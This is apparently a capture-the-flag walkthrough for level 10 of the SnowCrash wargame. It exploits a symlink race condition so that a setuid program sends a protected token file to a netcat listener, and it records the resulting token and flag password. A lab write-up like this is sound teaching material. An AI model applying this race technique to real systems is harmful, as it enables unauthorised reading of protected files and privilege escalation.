# Level 10

## step 1 : analyze level10

## step 2 : find host
```
$ ifconfig 
192.168.56.1
```
conversion:
192 * 2^24 + 168  * 2^16 + 56 * 2^8 + 1 = 3232249857

## step 3 : run the server and a client to receive messages
```
$ gcc mini_serv ; ./a.out 6969
$ nc 192.168.56.1 6969
```

## step 4 : pass right barrage of level08
run link.sh in SnowCrash
*this script links token and another random file has /tmp/link in loop to pass right barrage of level08*
```
$ sh link.sh
```

## step 4 : catch the token
while it's not token that is executed run :
```
$ ./level10 /tmp/link 192.168.56.1
```
token : woupa2yuojeeaaed06riuj63c

## step 5 :  get level11 password
```
$ su flag10
$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```
